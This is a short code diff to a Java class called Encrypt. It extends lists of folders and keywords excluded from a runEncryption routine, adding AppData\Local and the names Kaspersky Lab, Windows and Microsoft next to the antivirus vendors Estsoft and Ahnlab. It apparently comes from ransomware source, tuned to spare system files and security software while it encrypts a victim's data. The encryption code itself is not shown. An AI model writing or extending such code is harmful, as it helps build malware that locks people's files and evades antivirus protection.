@@ -27,11 +27,16 @@ public class Encrypt {
             "C:\\$Recycle.Bin",
             "C:\\$WinREAgent",
             "C:\\Program Files",
-            "C:\\Program Files (x86)"
+            "C:\\Program Files (x86)",
+            System.getenv("userprofile") + "\\Appdata\\Local"
     };
+
     private static final String[] EXCLUDED_KEYWORDS = {
             "Estsoft",
-            "Ahnlab"
+            "Ahnlab",
+            "Kaspersky Lab",
+            "Windows",
+            "Microsoft"
     };
 
     public static void runEncryption() {
